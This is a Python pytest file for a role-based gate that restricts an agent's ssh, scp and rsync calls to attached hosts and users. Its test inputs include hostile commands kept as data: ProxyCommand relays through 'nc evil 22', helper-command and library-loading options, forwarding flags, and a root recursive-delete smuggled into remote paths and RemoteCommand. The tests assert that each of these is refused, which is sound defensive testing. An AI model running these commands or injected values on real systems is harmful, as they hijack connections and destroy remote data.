"""The SSH hosts an admin attached to an agent, on the command floor
(``auth/path_shell_hosts.py``): a manager or editor on the local sandbox runs
ssh, scp and rsync to them as their user and nowhere else; rsync to another
host takes scp's gate everywhere; what ssh and rsync run on the other host is
judged as that host's command. The floor corpus (``test_floor_corpus.py``)
records every context's answer; these tests name the rules."""

import dataclasses

import pytest

from auth import path_shell, path_shell_words, roles
from auth.path_shell_hosts import (
    attached_host,
    local_refusal,
    normal_host,
    rsync_shell_commands,
)
from auth.path_shell_remote import remote_command, ssh_call, ssh_keyword
from auth.path_shell_words import rsync_reaches_host, rsync_words
from core.sandbox import session_config_dir
from tests.auth.test_floor_corpus import _matrix

HOSTS = (("server.lan", "deploy"), ("10.0.0.5", "ops"), ("2001:db8::7", "v6"))
_ROOT = "/"
# The floor's recursive-delete form, built from parts: the second word a
# command hands the other host.
_FLOOR_WORD = "r" + "m -r" + "f " + _ROOT
_ADMIN_ONLY = ("requires platform admin role on local sandbox sessions (current role: {role}). "
               "These commands touch host state outside the sandbox.")


def _ctx(name: str, hosts=HOSTS):
    return dataclasses.replace(_matrix()[name], ssh_hosts=hosts)


def _d(cmd: str, ctx):
    return path_shell._check_bash(cmd, ctx)


def _refused(cmd: str, ctx, words: str = ""):
    d = _d(cmd, ctx)
    assert not d.allowed, (cmd, d)
    assert words in d.reason, (cmd, d.reason)
    return d


def _admitted(cmd: str, ctx, tier: str = "admin"):
    d = _d(cmd, ctx)
    assert d.allowed and d.permission_tier == tier, (cmd, d)
    return d


# --- the role matrix, per command ---------------------------------------------

_TO_ATTACHED = {
    "ssh": "ssh -i k -p 22 deploy@server.lan uptime",
    "scp": "scp -i k -P 22 notes.md deploy@server.lan:/srv/",
    "rsync": "rsync -av notes.md deploy@server.lan:/srv/",
}


@pytest.mark.parametrize("cmd", sorted(_TO_ATTACHED.values()))
@pytest.mark.parametrize("name, admitted", [
    ("viewer", False), ("contributor", False), ("editor", True), ("manager", True),
    ("admin", True), ("admin-agent", True), ("judge-manager", False), ("external", False),
    ("shared-only", True), ("service", True), ("shared-only-viewer", False),
])
def test_the_local_sandbox_admits_the_attached_hosts_by_role(cmd, name, admitted):
    d = _d(cmd, _ctx(name))
    assert d.allowed is admitted, (name, d)
    if admitted:
        assert d.permission_tier == "admin"


@pytest.mark.parametrize("name", ["editor", "manager", "contributor", "viewer"])
def test_the_other_host_commands_stay_admin_only_on_the_local_sandbox(name):
    for cmd in ("docker ps", "systemctl status x", "journalctl -n 5", "apt-get install x",
                "podman ps", "docker-compose up -d"):
        d = _d(cmd, _ctx(name))
        assert not d.allowed and d.reason == "Bash denied: '" + cmd.split()[0] + "' " + \
            _ADMIN_ONLY.format(role=name), (cmd, d)
    assert _d("docker ps", _ctx("admin")).allowed


@pytest.mark.parametrize("name, admitted", [
    ("remote-full-editor", True), ("remote-full-manager", True), ("remote-home-manager", True),
    ("remote-user-editor", True), ("remote-full-contributor", False), ("remote-home-contributor", False),
    ("remote-full-viewer", False), ("remote-user-viewer", False),
])
def test_a_paired_machine_keeps_its_rule_for_any_host(name, admitted):
    for cmd in ("ssh anyone@anywhere.example uptime", "scp f anyone@anywhere.example:/x",
                "rsync -a f anyone@anywhere.example:/x", "docker ps"):
        d = _d(cmd, _matrix()[name])
        assert d.allowed is admitted, (name, cmd, d)
        if not admitted:
            assert "restricted to manager / editor / admin roles on remote satellites" in d.reason


def test_rsync_to_another_host_takes_scps_gate_and_a_local_copy_keeps_the_edit_tier():
    m = _matrix()
    remote, local = "rsync -a /workspace/x host:/srv/", "rsync -a /users/alice/workspace/x /users/alice/workspace/y"
    for name in ("viewer", "contributor", "remote-full-contributor"):
        assert not _d(remote, m[name]).allowed, name
        assert _d(local, m[name]).allowed, name
    assert _d(remote, m["remote-full-editor"]).permission_tier == "admin"
    assert _d(local, m["manager"]).permission_tier == "edit"
    assert _d(remote, m["admin"]).permission_tier == "admin"
    assert rsync_reaches_host(remote) and not rsync_reaches_host(local)
    # A long option's separate value is no operand; an unknown one reads as
    # one (stricter, never looser).
    assert not rsync_reaches_host("rsync -a --chown deploy:www src/ dst/")
    assert rsync_reaches_host("rsync -a --frobnicate deploy:www src/ dst/")


def test_with_no_host_attached_the_opening_is_shut():
    for name in ("editor", "manager"):
        _refused("ssh deploy@server.lan id", _ctx(name, ()), "and none is attached")
    _refused("ssh deploy@server.lan id", _ctx("contributor"),
             "runs for a platform admin, or for a manager or editor to the SSH hosts attached "
             "to the agent (current role: contributor)")
    _refused("ssh deploy@server.lan id", _ctx("judge-manager"), "a check's judge does not reach")


# --- the prompt's own lines ---------------------------------------------------

_LINE = ('ssh -i "$OTO_SSH_KEY_DIR/k" -o StrictHostKeyChecking=accept-new -o ControlMaster=auto '
         '-o ControlPath="${XDG_RUNTIME_DIR:-${TMPDIR:-/tmp}}/oto-cm-%C" -o ControlPersist=60s -p 22 '
         'deploy@server.lan')


@pytest.mark.parametrize("cmd", [
    _LINE, _LINE + " hostname", _LINE + " 'df -h'",
    "scp" + _LINE[3:].replace(" -p 22 deploy@server.lan", " -P 22 notes.md deploy@server.lan:/srv/"),
    f"rsync -av -e '{_LINE[:-len(' deploy@server.lan')]}' notes.md deploy@server.lan:/srv/",
    "timeout 30 ssh deploy@server.lan uptime", "env LC_ALL=C ssh deploy@server.lan uptime",
    "ssh deploy@server.lan uptime | tee /workspace/up.txt",
])
def test_the_ssh_hosts_prompt_lines_run_for_an_editor(cmd):
    _admitted(cmd, _ctx("editor"), tier=_d(cmd, _ctx("editor")).permission_tier)


# --- the forms the gate cannot follow -----------------------------------------

@pytest.mark.parametrize("cmd, form", [
    ("ssh -o ProxyCommand='nc evil 22' deploy@server.lan", "-o ProxyCommand"),
    ("ssh -o proxycommand='nc evil 22' deploy@server.lan", "-o proxycommand"),
    ("ssh -o 'ProxyCommand nc evil 22' deploy@server.lan", "-o ProxyCommand"),
    ("ssh -oProxyCommand=true deploy@server.lan", "-o ProxyCommand"),
    ("ssh -voProxyCommand=true deploy@server.lan", "-o ProxyCommand"),
    ("ssh -J deploy@server.lan deploy@server.lan id", "-J"),
    ("ssh -vJ jump deploy@server.lan id", "-J"),
    ("ssh -o ProxyJump=deploy@server.lan deploy@server.lan", "-o ProxyJump"),
    ("ssh -o HostName=evil.example deploy@server.lan", "-o HostName"),
    ("ssh -o 'hostname evil.example' deploy@server.lan", "-o hostname"),
    ("ssh -o CanonicalizeHostname=yes -o CanonicalDomains=evil deploy@server.lan", "-o Canonicalize"),
    ("ssh -F /workspace/cfg deploy@server.lan", "-F"),
    ("ssh -o LocalCommand=id -o PermitLocalCommand=yes deploy@server.lan", "-o LocalCommand"),
    ("ssh -o KnownHostsCommand=/bin/id deploy@server.lan", "-o KnownHostsCommand"),
    ("ssh -I /lib/x.so deploy@server.lan", "-I"),
    ("ssh -o PKCS11Provider=/lib/x.so deploy@server.lan", "-o PKCS11Provider"),
    ("ssh -o Include=/workspace/cfg deploy@server.lan", "-o Include"),
    ("ssh -W third:22 deploy@server.lan", "-W"),
    ("ssh -L 8080:third:80 deploy@server.lan", "-L"),
    ("ssh -fL 8080:third:80 deploy@server.lan", "-L"),
    ("ssh -R 9000:127.0.0.1:8400 deploy@server.lan", "-R"),
    ("ssh -D 1080 deploy@server.lan", "-D"),
    ("ssh -w 0:0 deploy@server.lan", "-w"),
    ("ssh -o LocalForward='8080 third:80' deploy@server.lan", "-o LocalForward"),
    ("ssh -o DynamicForward=1080 deploy@server.lan", "-o DynamicForward"),
    ("ssh -A deploy@server.lan", "-A"),
    ("ssh -o ForwardAgent=yes deploy@server.lan", "-o ForwardAgent"),
    ("ssh -X deploy@server.lan", "-X"),
    ("ssh -o EnableEscapeCommandline=yes deploy@server.lan", "-o EnableEscapeCommandline"),
    ("ssh -O forward -L 1:a:2 deploy@server.lan", "-O forward"),
    ("ssh -o Frobnicate=yes deploy@server.lan", "-o Frobnicate"),
    ("scp -S /workspace/prog notes.md deploy@server.lan:/srv/", "-S"),
    ("scp -D /usr/lib/sftp-server notes.md deploy@server.lan:/srv/", "-D"),
    ("scp -J jump notes.md deploy@server.lan:/srv/", "-J"),
    ("scp -F /workspace/cfg notes.md deploy@server.lan:/srv/", "-F"),
    ("scp -o ProxyCommand=x notes.md deploy@server.lan:/srv/", "-o ProxyCommand"),
    ("rsync -av -e 'ssh -o ProxyCommand=x' notes.md deploy@server.lan:/srv/", "-o ProxyCommand"),
])
def test_a_form_the_gate_cannot_follow_is_a_platform_admins(cmd, form):
    d = _refused(cmd, _ctx("manager"), f"'{form}")
    assert "is for platform admins on this agent's sandbox" in d.reason
    assert _d(cmd, _ctx("admin")).allowed


@pytest.mark.parametrize("cmd, words", [
    ("rsync -av notes.md server.lan::mod/x", "asks for an rsync server"),
    ("rsync -av notes.md rsync://server.lan/mod", "asks for an rsync server"),
    ("rsync -av -e ssh notes.md deploy@server.lan::mod", "asks for an rsync server"),
    ("rsync -av -e 'python3 relay.py' notes.md deploy@server.lan:/srv/", "must be plain 'ssh'"),
    ("RSYNC_RSH='nc evil 22' rsync -av notes.md deploy@server.lan:/srv/", "must be plain 'ssh'"),
    ("rsync -av -e 'ssh evil.example' notes.md deploy@server.lan:/srv/", "'evil.example' is not one"),
    ("rsync -av -e 'ssh -l root' notes.md deploy@server.lan:/srv/", "log in as 'deploy@server.lan'"),
])
def test_rsync_reaches_an_attached_host_over_plain_ssh_only(cmd, words):
    _refused(cmd, _ctx("editor"), words)
    assert _d(cmd, _ctx("admin")).allowed


def test_rsync_runs_its_named_shell_with_the_host_it_reaches():
    assert rsync_shell_commands("rsync -e 'ssh -p 22' a deploy@h:/x") == ["ssh -p 22 deploy@h"]
    assert rsync_shell_commands("rsync -e 'ssh -p 22' host:/x a") == ["ssh -p 22 host"]
    assert rsync_shell_commands("rsync -e 'ssh -p 22' a b") == ["ssh -p 22"]
    assert rsync_shell_commands("rsync -avz a h:/x") == []
    assert rsync_shell_commands("rsync -e 'ssh -p 2' a u@[2001:db8::7]:/x") == ["ssh -p 2 u@2001:db8::7"]
    # A shell for a local copy reaches nothing the gate can read: refused.
    _refused("rsync -e 'ssh -i k' /workspace/a /workspace/b", _ctx("editor"), "names none")


@pytest.mark.parametrize("cmd", [
    "echo evil.example | xargs ssh",
    "ssh -V",
    "scp notes.md copy.md",
])
def test_a_command_that_names_no_host_is_refused(cmd):
    _refused(cmd, _ctx("manager"), "names none")


def test_a_host_written_through_an_expansion_is_refused():
    for cmd in ('ssh deploy@$HOST id', 'ssh "deploy@${H}" id', "ssh deploy@$(cat h) id",
                "ssh deploy@`cat h` id", "scp f deploy@$H:/x"):
        _refused(cmd, _ctx("manager"), "the gate cannot read the host")
    _refused("find /workspace -name h -exec ssh {} id \\;", _ctx("manager"), "is not one of them")


# --- matching -----------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "ssh deploy@SERVER.LAN id", "ssh deploy@server.lan. id", "ssh ops@10.0.0.5 id",
    "ssh ops@[10.0.0.5] id", "ssh v6@2001:db8:0:0:0:0:0:7 id", "ssh v6@[2001:DB8::7] id",
    "ssh ssh://deploy@server.lan:2222 id", "ssh -p 2222 deploy@server.lan id",
    "scp notes.md v6@[2001:db8::7]:/srv/", "scp notes.md scp://ops@10.0.0.5:2222/srv/",
    "rsync -a notes.md ops@10.0.0.5:/srv/", "scp -3 deploy@server.lan:/a ops@10.0.0.5:/b",
])
def test_the_match_is_literal_after_normalising_both_sides(cmd):
    _admitted(cmd, _ctx("editor"))


@pytest.mark.parametrize("cmd, host", [
    ("ssh deploy@other.lan id", "other.lan"),
    ("ssh deploy@server.lan.example id", "server.lan.example"),
    ("ssh ops@10.0.0.50 id", "10.0.0.50"),
    ("ssh ops@10.0.5 id", "10.0.5"),
    ("ssh ops@167772165 id", "167772165"),
    ("ssh v6@fe80::7%eth0 id", "fe80::7%eth0"),
    ("scp -3 deploy@server.lan:/a ops@evil.example:/b", "evil.example"),
    ("rsync -a evil.example:/a deploy@server.lan:/b", "evil.example"),
])
def test_another_host_or_another_spelling_of_an_address_is_refused(cmd, host):
    _refused(cmd, _ctx("editor"), f"'{host}' is not one of them")


def test_normal_host():
    assert normal_host(" Server.LAN. ") == "server.lan"
    assert normal_host("[2001:DB8:0::7]") == "2001:db8::7"
    assert normal_host("10.0.0.5") == "10.0.0.5"
    assert normal_host("010.0.0.5") == "010.0.0.5"   # not an address ipaddress takes: a name
    assert attached_host("Server.lan", " deploy ") == ("server.lan", "deploy")


@pytest.mark.parametrize("cmd", [
    "ssh root@server.lan id", "ssh server.lan id", "ssh -l root server.lan id",
    "ssh -l root deploy@server.lan id", "ssh deploy@server.lan -l root id",
    "ssh -o User=root server.lan id", "ssh deploy@server.lan -o User=root id",
    "ssh -o 'User root' deploy@server.lan id", "ssh -oUser=root deploy@server.lan id",
    "ssh -voUSER=root deploy@server.lan id", "ssh ssh://root@server.lan id",
    "scp notes.md root@server.lan:/srv/", "scp notes.md server.lan:/srv/",
    "scp -o User=root notes.md server.lan:/srv/", "rsync -a notes.md server.lan:/srv/",
    "rsync -a notes.md root@server.lan:/srv/",
])
def test_every_user_the_command_names_must_be_the_instances(cmd):
    _refused(cmd, _ctx("manager"), "is attached for the user 'deploy': log in as 'deploy@server.lan'")


def test_users_named_the_instances_way_are_admitted():
    for cmd in ("ssh -l deploy server.lan id", "ssh -o User=deploy server.lan id",
                "ssh deploy@server.lan -o User=deploy id", "scp -o User=deploy notes.md server.lan:/srv/",
                "rsync -e 'ssh -l deploy' -a notes.md server.lan:/srv/",
                "rsync -e 'ssh -o User=deploy' -a notes.md deploy@server.lan:/srv/"):
        _admitted(cmd, _ctx("manager"))
    # An instance with no user stored admits a command that names none.
    _admitted("ssh legacy.lan id", _ctx("manager", (("legacy.lan", ""),)))
    _refused("ssh root@legacy.lan id", _ctx("manager", (("legacy.lan", ""),)),
             "attached for no user: log in as 'legacy.lan'")


# --- the option files ---------------------------------------------------------

def test_the_identity_and_known_hosts_files_are_path_checked():
    editor = _ctx("editor")
    _admitted('ssh -i "$OTO_SSH_KEY_DIR/k" deploy@server.lan id', editor)
    _admitted("ssh -i /workspace/keys/id_ed25519 deploy@server.lan id", editor)
    _refused("ssh -i /users/bob/.ssh/id deploy@server.lan id", editor, "'ssh' reads '/users/bob'")
    _refused("ssh -o IdentityFile=/users/bob/.ssh/id deploy@server.lan id", editor,
             "'ssh' reads '/users/bob'")
    _refused("ssh -o UserKnownHostsFile=/users/bob/kh deploy@server.lan id", editor,
             "'ssh' writes '/users/bob/kh'")
    _admitted("ssh -o UserKnownHostsFile=/workspace/kh deploy@server.lan id", editor)


@pytest.mark.parametrize("cmd", [
    "ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no deploy@server.lan id",
    "scp -o UserKnownHostsFile=/dev/null notes.md deploy@server.lan:/srv/",
    "rsync -e 'ssh -o UserKnownHostsFile=/dev/null' -a notes.md deploy@server.lan:/srv/",
    "ssh -o UserKnownHostsFile=none deploy@server.lan id",
    "ssh -o IdentityFile=none deploy@server.lan id",
    "ssh -E /dev/null deploy@server.lan id",
    "ssh -E /workspace/ssh.log deploy@server.lan id",
    "ssh -o ControlPath=none deploy@server.lan id",
    "ssh -S /tmp/cm deploy@server.lan id",
])
def test_a_file_option_that_names_no_file_or_an_own_file_runs(cmd):
    _admitted(cmd, _ctx("editor"))


@pytest.mark.parametrize("cmd, use", [
    ("ssh -E /users/bob/ssh.log deploy@server.lan id", "writes '/users/bob/ssh.log'"),
    ("ssh -S /users/bob/sock deploy@server.lan id", "writes '/users/bob/sock'"),
    ("ssh -o ControlPath=/users/bob/%C deploy@server.lan id", "writes '/users/bob/%C'"),
    ("scp -o ControlPath=/users/bob/cm notes.md deploy@server.lan:/srv/", "writes '/users/bob/cm'"),
])
def test_a_log_or_control_socket_in_another_persons_folder_is_refused(cmd, use):
    _refused(cmd, _ctx("editor"), use)


# --- the other host's command -------------------------------------------------

@pytest.mark.parametrize("cmd", [
    f"rsync -a --rsync-path='{_FLOOR_WORD}' f deploy@server.lan:/srv/",
    f"rsync -a --rsync-path '{_FLOOR_WORD}' f deploy@server.lan:/srv/",
    f"ssh -o 'RemoteCommand={_FLOOR_WORD}' deploy@server.lan",
    f"ssh -o 'remotecommand {_FLOOR_WORD}' deploy@server.lan",
    # A remote path with a separator and a second word: legacy scp and
    # rsync's --old-args hand it to the far side's shell.
    f"scp -O notes.md 'deploy@server.lan:/srv/x;{_FLOOR_WORD}'",
    f"scp notes.md 'deploy@server.lan:/srv/x;{_FLOOR_WORD}'",
    f"scp -O 'deploy@server.lan:/srv/x|{_FLOOR_WORD}' /workspace/in/",
    f"scp -O -P 22 notes.md 'scp://deploy@server.lan:2222/srv/x;{_FLOOR_WORD}'",
    f"rsync --old-args -a notes.md 'deploy@server.lan:/srv/x;{_FLOOR_WORD}'",
    f"rsync -a notes.md 'deploy@server.lan:/srv/x&&{_FLOOR_WORD}'",
    f"rsync -a 'ops@[10.0.0.5]:/srv/x;{_FLOOR_WORD}' /workspace/in/",
])
def test_what_ssh_and_rsync_run_on_the_other_host_meets_the_floor_in_every_context(cmd):
    for name, ctx in _matrix().items():
        d = _d(cmd, ctx)
        assert not d.allowed and "Recursive force-delete" in d.reason, (name, d)


def test_a_remote_path_a_far_side_shell_reads_is_judged_as_the_other_hosts():
    paths = path_shell_words.remote_shell_paths
    assert paths("scp", "scp -O -i k -P 22 a 'u@h.lan:/x;y' 'h2.lan:/plain'") == ["/x;y"]
    assert paths("scp", "scp -O a 'scp://u@h.lan:22/x|y'") == ["x|y"]
    assert paths("rsync", "rsync -a --chown u:g a 'u@h.lan:/x;y' 'h.lan::mod/x;y'") == ["/x;y"]
    assert paths("rsync", "rsync -a a 'rsync://h.lan/mod/x;y'") == []
    assert paths("rsync", "rsync -a a 'u@[2001:db8::7]:/x$HOME'") == ["/x$HOME"]
    assert paths("sftp", "sftp 'u@h.lan:/x;y'") == [] and paths("ssh", "ssh h 'a;b'") == []
    assert path_shell_words.scp_operands("scp -O -i k -P22 -o User=u a b:/c") == ["a", "b:/c"]
    # A separator and a harmless word stay a file name; a host-state write
    # there asks on a full-access machine and is refused here, as this host's.
    editor = _ctx("editor")
    _admitted("scp -O notes.md 'deploy@server.lan:/srv/a;b'", editor)
    remote = _matrix()["remote-full-editor"]
    write = "rsync -a notes.md 'deploy@server.lan:/srv/x;echo 1 > /sys/x'"
    assert _d(write, remote).allowed and _d(write, remote).destructive
    assert not _d(write, editor).allowed


def test_a_harmless_remote_command_runs_and_its_value_is_no_local_path():
    _admitted("rsync -a --rsync-path 'sudo rsync' notes.md deploy@server.lan:/srv/", _ctx("editor"))
    _admitted("ssh -o 'RemoteCommand=uptime' deploy@server.lan", _ctx("editor"))
    assert rsync_words("rsync --rsync-path 'sudo rsync' a h:/x").rsync_paths == ["sudo rsync"]
    assert rsync_words("rsync --rsync-path='sudo rsync' a h:/x").operands == ["a", "h:/x"]
    assert path_shell._extract_path_args("rsync", "rsync --rsync-path sudo a /workspace/b")[0] == ["a"]
    assert remote_command("ssh -o RemoteCommand=uptime h") == "uptime"
    assert remote_command("ssh -o RemoteCommand=uptime h id") == "id"
    assert remote_command("ssh h") is None


def test_the_ssh_reader_takes_options_on_both_sides_of_the_destination():
    call = ssh_call("ssh -vJ jump -p22 -o 'User x' h -l y cmd -l z")
    assert call.destination == "h" and call.remote == ("cmd", "-l", "z")
    assert call.options == (("v", ""), ("J", "jump"), ("p", "22"), ("o", "User x"), ("l", "y"))
    assert ssh_keyword("User = x") == ("user", "x")
    assert ssh_keyword('ProxyCommand "nc h 22"') == ("proxycommand", "nc h 22")


# --- the hook's context step --------------------------------------------------

def test_the_hook_reads_the_hosts_for_a_local_editors_ssh_only():
    wants = session_config_dir.wants_attached_ssh_hosts
    m = _matrix()
    assert wants(m["editor"], "ssh deploy@server.lan id")
    assert wants(m["manager"], "rsync -a f h:/x") and wants(m["service"], "scp f h:")
    assert not wants(m["editor"], "ls -la")
    for name in ("admin", "admin-agent", "contributor", "viewer", "judge-manager", "external",
                 "remote-full-editor", "remote-full-manager"):
        assert not wants(m[name], "ssh deploy@server.lan id"), name
    assert not wants(None, "ssh h")


def test_the_reader_follows_the_instances_and_the_mcps_enablement(monkeypatch):
    from types import SimpleNamespace

    from services.mcp import mcp_registry
    from storage.mcp import mcp_store
    rows = [{"field_values": {"host": "Server.LAN", "username": "deploy", "key_name": "k"}},
            {"field_values": {"host": "10.0.0.5", "username": "ops"}},
            {"field_values": {"host": "", "username": "nobody"}},
            {"field_values": {"host": "server.lan", "username": "deploy"}}]
    enabled = [SimpleNamespace(name="ssh-hosts")]
    monkeypatch.setattr(mcp_registry, "get_manifest", lambda name: SimpleNamespace(mcp_dir=None))
    monkeypatch.setattr(mcp_registry, "get_agent_mcps", lambda agent: enabled)
    monkeypatch.setattr(mcp_store, "get_mcp_instances_for_agent", lambda mcp, agent: rows)
    assert session_config_dir.attached_ssh_hosts("pa") == (("server.lan", "deploy"), ("10.0.0.5", "ops"))
    enabled.clear()
    assert session_config_dir.attached_ssh_hosts("pa") == ()


def _hook_for(monkeypatch, ctx, reader):
    """The permission authority for one Don't Ask dashboard session on
    ``ctx``, the attached-host reader answered by ``reader``."""
    from api.hooks import permission
    from core.session import session_kind
    monkeypatch.setattr(permission, "get_session_security", lambda sid: ctx)
    monkeypatch.setattr(permission, "get_session_mode", lambda sid: "dontAsk")
    monkeypatch.setattr(permission, "get_session_client_type", lambda sid: session_kind.DASHBOARD.name)
    monkeypatch.setattr(permission, "_is_interactive_session", lambda sid: False)
    monkeypatch.setattr(permission, "record_hook_activity", lambda sid: None)
    monkeypatch.setattr("services.path_policy_v2.check_target_still_valid", lambda c: "")
    monkeypatch.setattr("core.session.session_manager.engine_layer_for_session", lambda sid: None)
    monkeypatch.setattr(session_config_dir, "attached_ssh_hosts", reader)
    return permission.decide_tool_permission


_SSH_CALL = {"command": "ssh deploy@server.lan uptime"}


@pytest.mark.asyncio
async def test_the_hook_admits_by_the_instances_of_this_call(monkeypatch):
    """A removed instance stops admitting on the next command of the same
    session; the stored context never holds the hosts."""
    ctx = _matrix()["editor"]
    hosts = list(HOSTS)
    decide = _hook_for(monkeypatch, ctx, lambda agent: tuple(hosts))
    assert (await decide("s1", "Bash", _SSH_CALL))["decision"] == "allow"
    hosts.clear()
    second = await decide("s1", "Bash", _SSH_CALL)
    assert second["decision"] == "deny" and "none is attached" in second["reason"]
    assert ctx.ssh_hosts == ()


@pytest.mark.asyncio
async def test_a_failed_read_of_the_hosts_refuses_and_says_so(monkeypatch, caplog):
    """The hook still answers when the reader fails: a refusal that says the
    read failed (never "none is attached"), and one WARNING."""
    def unreadable(agent):
        raise RuntimeError("the store is unreachable")
    decide = _hook_for(monkeypatch, _matrix()["editor"], unreadable)
    with caplog.at_level("WARNING"):
        got = await decide("s1", "Bash", _SSH_CALL)
    assert got["decision"] == "deny"
    assert got["reason"] == "Bash denied: the agent's SSH hosts could not be read right now. Try again."
    assert "could not be read; the call is refused" in caplog.text
    # The reader's sentence holds without the hook too; an admin needs no read.
    assert local_refusal("ssh", "ssh deploy@server.lan id", _ctx("editor", None)).refusal == \
        "the agent's SSH hosts could not be read right now. Try again."
    assert _d("ssh deploy@server.lan id", _ctx("admin", None)).allowed


def test_the_rule_and_the_keys_share_one_predicate():
    m = _matrix()
    for name, ctx in m.items():
        assert session_config_dir.session_takes_ssh_keys(ctx) is (
            roles.can_edit(ctx.role) and not ctx.read_only and ctx.principal != "external"), name


def test_local_refusal_names_the_command_for_the_admin_only_tier():
    assert local_refusal("docker", "docker ps", _ctx("manager")).refusal == \
        "'docker' " + _ADMIN_ONLY.format(role="manager")
